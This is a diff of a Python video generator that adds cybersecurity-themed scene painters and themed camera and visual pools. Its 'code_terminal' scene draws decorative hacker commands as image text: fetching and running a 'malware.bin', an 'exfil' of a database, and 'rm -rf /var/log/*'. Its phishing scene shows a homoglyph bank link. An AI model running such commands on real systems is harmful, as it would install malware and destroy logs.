+        sc("accel", 1.3 * k, "consequence", _cam(1),
            tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
-        sc("accel", 1.2 * k, "consequence", "push_in",
+        sc("accel", 1.2 * k, "consequence", _cam(2),
            tx("1 УСТРОЙСТВО", mode="pop"), "whip", "impact", (1.0, 1.6)),
-        sc("accel", 1.8 * k, "consequence", "push_out",
+        sc("accel", 1.8 * k, "consequence", _cam(3),
            tx("ВСЯ СИСТЕМА", mode="tracking"), "zoom", "riser", (0.8, 1.6),
            "accent2"),
         # 50-60с: КУЛЬМИНАЦИЯ — быстрые кадры, затем резкое замедление.
-        # Визуал: attack_grid → face_glow → server → пауза → бренд.
-        # Камера shake→snap→push_in→static: от хаоса к тишине.
         sc("climax", 0.7 * k, "attack_grid", "shake", [], "hard_cut",
            "impact", (1.5, 1.5), "accent2", typ="graphic"),
-        sc("climax", 0.5 * k, "face_glow", "snap", [], "hard_cut",
+        sc("climax", 0.5 * k, _pv[6 % len(_pv)], "snap", [], "hard_cut",
            "bass", (1.4, 1.4)),
-        sc("climax", 0.8 * k, "server_corridor", "push_in", [], "whip",
+        sc("climax", 0.8 * k, "server_corridor", _cam(4), [], "whip",
            "whoosh", (1.0, 2.2)),
         sc("climax", 1.2 * k, "pause_black", "static", [], "dip",
            "silence", (0.4, 0.4)),
@@ -526,17 +757,14 @@ def template_shots(topic, seconds=55, style_name="cybersecurity_cinematic"):
     for i, s in enumerate(shots):
         s = dict(s)
         s["id"] = f"S{i + 1:02d}"
-        # озвучка/субтитр из пула акта (M16: без повторов в одном видео)
         act = s.get("act", "problem")
         pool = NARR.get(act) or NARR["problem"]
         used = _narr_used.get(act, set())
-        # ищем первый неиспользованный индекс
         idx = _narr_i.get(act, 0)
         start = idx
         while idx % len(pool) in used and (idx - start) < len(pool):
             idx += 1
         if (idx - start) >= len(pool):
-            # все использованы — сбрасываем used и берём первый
             _narr_used[act] = set()
             used = set()
             idx = start
@@ -550,9 +778,7 @@ def template_shots(topic, seconds=55, style_name="cybersecurity_cinematic"):
             s["sub"] = b[:70]
             if s.get("type") == "cinematic":
                 s["subs"] = [{"lines": [s["sub"]], "mode": "sub"}]
-        # читаемость уже в шаблоне (M15): текст должен успеть прочитаться
         s["dur"] = max(s["dur"], _min_dur(s))
-        # подгон под seconds делает generate_cinematic; тут только id/seed
         s["seed"] = (abs(hash(topic)) + i * 131) % (2 ** 32)
         out.append(s)
     return out
@@ -712,14 +938,20 @@ def script_to_shots(script_text, topic=None, seconds=55,
             acts[i] = cyc[ci % len(cyc)]
             ci += 1
 
-    visuals = ["phone_message", "login_screen", "keyboard", "qr_scan",
-               "token_panel", "server_corridor", "cables", "person",
-               "phone_call", "face_glow", "eye", "server_rack",
-               "switch_macro", "consequence", "bokeh"]
-    peak_pool = ["attack_grid", "face_glow", "server_corridor",
-                 "eye", "consequence"]
-    cameras = ["push_in", "drift", "push_out", "tilt", "whip_pan", "push_in"]
-    trans = ["hard_cut", "whip", "zoom", "match", "hard_cut", "dip"]
+    # M23: тематические визуалы вместо хардкода
+    themes = extract_visual_theme(topic)
+    pv = theme_painters(themes)
+    cm = theme_cameras(themes)
+    tr = theme_trans(themes)
+    visuals = pv[:15] if len(pv) >= 15 else pv + ["phone_message", "login_screen",
+               "keyboard", "qr_scan", "server_corridor", "cables", "person",
+               "face_glow", "eye", "server_rack", "consequence", "bokeh"][:15 - len(pv)]
+    peak_pool = [v for v in visuals[:8] if v not in PURE_TYPO_VISUALS] or ["attack_grid", "face_glow",
+                 "server_corridor", "eye", "consequence"]
+    cameras = cm[:6] if len(cm) >= 6 else cm + ["push_in", "drift", "push_out",
+               "tilt", "whip_pan", "static"][:6 - len(cm)]
+    trans_pool = tr[:6] if len(tr) >= 6 else tr + ["hard_cut", "whip", "zoom",
+                  "match", "dip", "glitch"][:6 - len(tr)]
 
     # M18: стартовая позиция видеоряда от хэша статьи — разные статьи
     # дают разный порядок художников/камер, а не один и тот же цикл
@@ -737,7 +969,7 @@ def script_to_shots(script_text, topic=None, seconds=55,
         shots.append(
             {"sec": si,
              "shot": sc(act, dur, vis, cameras[(i + off) % len(cameras)], [],
-                        trans[(i * 3 + off) % len(trans)], sfx, (1.2, 1.2),
+                        trans_pool[(i * 3 + off) % len(trans_pool)], sfx, (1.2, 1.2),
                         accent, "", None, chunk, _smart_sub(chunk))})
 
     # сборка по секциям: кадры + ударная типографика из заголовка;
@@ -1221,6 +1453,224 @@ def paint_scene(visual, p, seed, P, fonts, accent_key="accent"):
                                  (qx2 + qs2 + 46, qy2 + qs2 + 46, -1, -1)):
             d.line([(sx, sy), (sx + dx * L, sy)], fill=accent, width=7)
             d.line([(sx, sy), (sx, sy + dy * L)], fill=accent, width=7)
+
+    # ---- M23: тематические художники ----
+    elif visual == "lock_shield":
+        # замок-щит: крупный силуэт замка + щит фоне,安全感
+        cx, cy = W // 2, H // 2 - 60
+        # щит
+        pts = [(cx, cy - 320), (cx + 200, cy - 180), (cx + 200, cy + 100),
+               (cx, cy + 320), (cx - 200, cy + 100), (cx - 200, cy - 180)]
+        d.polygon(pts, fill=(12, 18, 32), outline=accent, width=5)
+        # замок
+        d.rounded_rectangle([cx - 60, cy - 40, cx + 60, cy + 80], radius=12,
+                            fill=(18, 28, 50), outline=accent, width=4)
+        d.arc([cx - 40, cy - 100, cx + 40, cy - 20], 180, 0,
+              fill=accent, width=5)
+        # ключевое отверстие
+        d.ellipse([cx - 10, cy + 10, cx + 10, cy + 40], fill=accent)
+        d.rectangle([cx - 4, cy + 30, cx + 4, cy + 60], fill=accent)
+        pulse = 0.5 + 0.5 * math.sin(p * math.pi * 2)
+        img = _glow_spot(img.convert("RGBA"), cx, cy, int(200 + 100 * pulse), accent, 60).convert("RGB")
+        d = ImageDraw.Draw(img, "RGBA")
+    elif visual == "wallet_crypto":
+        # крипто-кошелёк + монеты + график
+        _bokeh_layer(d, seed + 20, P, 10)
+        cx, cy = W // 2, H // 2
+        # кошелёк
+        d.rounded_rectangle([cx - 160, cy - 100, cx + 160, cy + 80], radius=24,
+                            fill=(18, 24, 44), outline=accent, width=4)
+        d.rounded_rectangle([cx + 80, cy - 50, cx + 160, cy + 20], radius=12,
+                            fill=(24, 36, 64), outline=accent, width=3)
+        # монеты
+        for i in range(4):
+            ox = cx - 100 + i * 70
+            oy = cy + 160 + int(30 * math.sin(p * math.pi * 2 + i))
+            d.ellipse([ox - 28, oy - 28, ox + 28, oy + 28],
+                      fill=(200, 170, 60), outline=(140, 110, 20), width=3)
+            _center_text(d, oy - 14, "₿", _font(EXO2, 24, 900), (80, 60, 10), ox)
+        # график
+        pts = [(cx - 180, cy + 340)]
+        for x in range(0, 360, 20):
+            gy = int(cy + 300 - 80 * math.sin((x / 360.0) * math.pi * 2 + p * 2))
+            pts.append((cx - 180 + x, gy))
+        d.line(pts, fill=accent, width=3)
+    elif visual == "cloud_data":
+        # облако + пакеты данных
+        cx, cy = W // 2, H // 2 - 100
+        # облако из кругов
+        for ox, oy, r_ in [(-80, 0, 80), (0, -40, 100), (80, 0, 80), (-40, 30, 70), (40, 30, 70)]:
+            d.ellipse([cx + ox - r_, cy + oy - r_, cx + ox + r_, cy + oy + r_],
+                      fill=(14, 22, 40), outline=P["line"], width=2)
+        # пакеты данных падают из облака
+        for i in range(5):
+            px = cx - 120 + i * 60
+            py = cy + 140 + int((p * 200 + i * 50) % 300)
+            sz = 18 + (i % 3) * 6
+            d.rectangle([px - sz, py - sz, px + sz, py + sz],
+                        fill=accent if i % 2 == 0 else P["line"])
+        _center_text(d, cy + 500, "// ДАННЫЕ В ОБЛАКЕ", f_xs, P["sub"], cx)
+    elif visual == "mobile_notif":
+        # уведомление на экране смартфона
+        _bokeh_layer(d, seed + 21, P, 12)
+        cx, cy = W // 2, H // 2
+        box = _phone_frame(d, P, cx, cy, glow=accent)
+        # уведомление
+        nx, ny = box[0] + 40, box[1] + 120
+        nw = box[2] - box[0] - 80
+        d.rounded_rectangle([nx, ny, nx + nw, ny + 100], radius=16,
+                            fill=(20, 32, 58), outline=accent, width=3)
+        _center_text(d, ny + 12, "⚠ УВЕДОМЛЕНИЕ", f_xs, accent, cx)
+        _center_text(d, ny + 48, "ТРЕВОЖНОЕ", f_xs, P["sub"], cx)
+        # красная точка
+        d.ellipse([nx + nw - 20, ny + 10, nx + nw + 4, ny + 34], fill=(255, 60, 60))
+    elif visual == "email_phish":
+        # поддельное письмо
+        _bokeh_layer(d, seed + 22, P, 10)
+        cx, cy = W // 2, H // 2
+        # конверт
+        d.rounded_rectangle([cx - 220, cy - 160, cx + 220, cy + 120], radius=16,
+                            fill=(18, 26, 48), outline=P["line"], width=3)
+        d.line([(cx - 220, cy - 160), (cx, cy - 20)], fill=P["line"], width=2)
+        d.line([(cx + 220, cy - 160), (cx, cy - 20)], fill=P["line"], width=2)
+        # «от» и «тема»
+        d.text((cx - 190, cy - 120), "From: bank@reаl.com", font=f_xs, fill=P["sub"])
+        d.text((cx - 190, cy - 80), "Subject: Ваш акаунт", font=f_s, fill=(240, 244, 252))
+        # красный flag
+        d.polygon([(cx + 140, cy - 120), (cx + 200, cy - 100), (cx + 140, cy - 80)],
+                  fill=(220, 50, 50))
+        # ссылка
+        d.text((cx - 190, cy + 20), "https://bаnk-login.secure...", font=f_xs, fill=(255, 120, 60))
+        img = _glow_spot(img.convert("RGBA"), cx, cy + 20, 200, (255, 120, 60), 40).convert("RGB")
+        d = ImageDraw.Draw(img, "RGBA")
+    elif visual == "code_terminal":
+        # терминал + строки кода
+        d.rectangle([60, 200, W - 60, H - 300], fill=(6, 10, 18), outline=P["line"], width=3)
+        # заголовок терминала
+        d.rectangle([60, 200, W - 60, 260], fill=(16, 24, 40))
+        d.text((80, 210), "root@server:~$", font=f_xs, fill=accent)
+        # строки кода
+        code_lines = [
+            "$ wget http://malware.bin", "$ chmod +x malware.bin",
+            "$ ./malware.bin --stealth", "# EXPLOIT: CVE-2024-1234",
+            "$ exfil --target database", ">> ACCESS GRANTED",
+            "# BACKDOOR installed", "$ rm -rf /var/log/*",
+        ]
+        visible = min(len(code_lines), int(p * len(code_lines)) + 1)
+        for i in range(visible):
+            y = 290 + i * 60
+            col = accent if "EXPLOIT" in code_lines[i] or "ACCESS" in code_lines[i] else (80, 120, 80)
+            if "malware" in code_lines[i]:
+                col = (255, 80, 60)
+            d.text((80, y), code_lines[i][:50], font=f_xs, fill=col)
+        # мигающий курсор
+        if int(p * 4) % 2 == 0:
+            vy = 290 + visible * 60
+            d.rectangle([80, vy, 96, vy + 24], fill=accent)
+    elif visual == "net_graph":
+        # сетевой граф + бегущий пакет
+        _bokeh_layer(d, seed + 23, P, 8)
+        nodes = [(W // 2, 350), (250, 650), (W - 250, 650),
+                 (180, 1000), (W // 2, 900), (W - 180, 1000),
+                 (W // 2, 1350)]
+        # рёбра
+        edges = [(0, 1), (0, 2), (1, 3), (1, 4), (2, 4), (2, 5), (3, 6), (4, 6), (5, 6)]
+        for a, b in edges:
+            d.line([nodes[a], nodes[b]], fill=P["line"], width=2)
+        # бегущий пакет
+        ei = int(p * len(edges)) % len(edges)
+        a, b = edges[ei]
+        t_ = (p * len(edges)) % 1.0
+        px = int(nodes[a][0] + (nodes[b][0] - nodes[a][0]) * t_)
+        py = int(nodes[a][1] + (nodes[b][1] - nodes[a][1]) * t_)
+        # узлы
+        for i, (nx, ny) in enumerate(nodes):
+            r_ = 30 if i != 6 else 44
+            col = accent if i == 6 else P["line"]
+            d.ellipse([nx - r_, ny - r_, nx + r_, ny + r_], fill=(12, 18, 32), outline=col, width=3)
+        img = _glow_spot(img.convert("RGBA"), px, py, 60, accent, 80).convert("RGB")
+        d = ImageDraw.Draw(img, "RGBA")
+    elif visual == "cam_surveillance":
+        # камера + конус обзора + REC
+        cx, cy = W // 2, 380
+        # камера
+        d.rounded_rectangle([cx - 60, cy - 30, cx + 60, cy + 30], radius=8,
+                            fill=(30, 40, 60), outline=P["line"], width=3)
+        d.rectangle([cx + 60, cy - 10, cx + 120, cy + 10], fill=(30, 40, 60))
+        d.ellipse([cx + 100, cy - 16, cx + 140, cy + 16], outline=accent, width=3)
+        # конус обзора
+        pts_cone = [(cx - 40, cy + 30), (cx - 320, H - 300), (cx + 320, H - 300)]
+        # полупрозрачный конус через наложение
+        cone_img = Image.new("RGBA", (W, H), (0, 0, 0, 0))
+        cone_d = ImageDraw.Draw(cone_img, "RGBA")
+        cone_d.polygon(pts_cone, fill=(accent[0], accent[1], accent[2], 25))
+        img = Image.alpha_composite(img.convert("RGBA"), cone_img).convert("RGB")
+        d = ImageDraw.Draw(img, "RGBA")
+        # REC
+        rec_x, rec_y = W - 180, 180
+        blink = int(p * 3) % 2 == 0
+        if blink:
+            d.ellipse([rec_x - 10, rec_y - 10, rec_x + 10, rec_y + 10], fill=(255, 40, 40))
+        d.text((rec_x + 16, rec_y - 10), "REC", font=f_s, fill=(255, 40, 40) if blink else P["sub"])
+        _center_text(d, H - 260, "// НАБЛЮДЕНИЕ", f_xs, P["sub"], W // 2)
+    elif visual == "firewall_wall":
+        # кирпичная стена + огненная линия
+        brick_w, brick_h = 80, 40
+        for row in range(18):
+            y0 = 260 + row * brick_h
+            offset = brick_w // 2 if row % 2 else 0
+            for col in range(-1, W // brick_w + 2):
+                x0 = col * brick_w + offset
+                breach = (abs(x0 - W // 2) < 120 and 8 <= row <= 12)
+                if not breach:
+                    d.rectangle([x0 + 2, y0 + 2, x0 + brick_w - 2, y0 + brick_h - 2],
+                                fill=(22, 34, 56), outline=(16, 24, 42), width=1)
+        # огненная линия — горизонтальный accent-бар
+        fire_y = 260 + 10 * brick_h
+        d.rectangle([0, fire_y - 4, W, fire_y + 4], fill=accent)
+        # искры в точке прорыва
+        spark_x = W // 2
+        for i in range(6):
+            sx = spark_x + int(rnd.gauss(0, 80))
+            sy = fire_y + int(rnd.gauss(0, 40))
+            d.ellipse([sx - 4, sy - 4, sx + 4, sy + 4], fill=accent)
+        img = _glow_spot(img.convert("RGBA"), spark_x, fire_y, 120, (255, 100, 30), 70).convert("RGB")
+        d = ImageDraw.Draw(img, "RGBA")
+        _center_text(d, fire_y + 50, "// FIREWALL", f_xs, accent, W // 2)
+    elif visual == "ai_brain":
+        # нейросеть: 5 слоёв, связи между нейронами
+        layers = [3, 5, 6, 5, 3]
+        layer_x = [140, 340, W // 2, W - 340, W - 140]
+        neurons = []
+        for li, count in enumerate(layers):
+            layer_neurons = []
+            spacing = 280 // (count + 1)
+            for ni in range(count):
+                ny = H // 2 - 140 + (ni + 1) * spacing
+                layer_neurons.append((layer_x[li], ny))
+            neurons.append(layer_neurons)
+        # связи
+        for li in range(len(neurons) - 1):
+            for a in neurons[li]:
+                for b in neurons[li + 1]:
+                    d.line([a, b], fill=P["line"], width=1)
+        # активированные связи (бегущий импульс)
+        active_layer = int(p * (len(neurons) - 1))
+        if active_layer < len(neurons) - 1:
+            for a in neurons[active_layer]:
+                for b in neurons[active_layer + 1]:
+                    d.line([a, b], fill=accent, width=2)
+        # нейроны
+        for li, layer_neurons in enumerate(neurons):
+            for nx, ny in layer_neurons:
+                r_ = 18
+                is_active = li == active_layer
+                col = accent if is_active else P["line"]
+                d.ellipse([nx - r_, ny - r_, nx + r_, ny + r_],
+                          fill=(14, 22, 40) if not is_active else (accent[0] // 2, accent[1] // 2, accent[2] // 2),
+                          outline=col, width=3)
+        img = _glow_spot(img.convert("RGBA"), W // 2, H // 2, 250, accent, 50).convert("RGB")
+        d = ImageDraw.Draw(img, "RGBA")
 
     img = _vignette(img)
     img = _grain(img, seed)
